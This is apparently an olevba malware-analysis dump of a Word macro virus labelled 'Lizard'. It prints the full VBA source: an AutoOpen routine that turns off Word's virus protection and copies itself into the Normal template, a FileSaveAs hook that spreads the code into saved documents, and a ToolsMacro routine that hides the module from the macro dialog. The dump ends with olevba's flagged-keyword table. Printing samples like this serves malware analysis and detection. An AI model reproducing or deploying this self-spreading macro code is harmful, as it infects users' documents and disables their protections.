olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lizard-030a3345089f3395aa8f94a32eb24a9f9eb6869b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lizard-030a3345089f3395aa8f94a32eb24a9f9eb6869b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()

End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()

End Sub
-------------------------------------------------------------------------------
VBA MACRO Lizard.bas 
in file: Virus.MSWord.Lizard-030a3345089f3395aa8f94a32eb24a9f9eb6869b - OLE stream: 'Macros/VBA/Lizard'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[Macroname$](i, 0) = "Lizard" Then
    MsgBox "a good Lizard is living here     'written by Lord Arz"
    End If
Next i
application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Lizard", wdOrganizerObjectProjectItems
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
application.OrganizerCopy NormalTemplate.FullName, ActiveDocument, "Lizard", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub ToolsMacro()
NormalTemplate.VBProject.VBComponents("Lizard").Export ("Lizard.bas")
application.OrganizerDelete NormalTemplate.FullName, "Lizard", wdOrganizerObjectProjectItems
While Dialogs(wdDialogToolsMacro).Display
Wend
NormalTemplate.VBProject.VBComponents.import ("Lizard.bas")
Kill "Lizard.bas"
End Sub


Sub ViewVBCode()
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

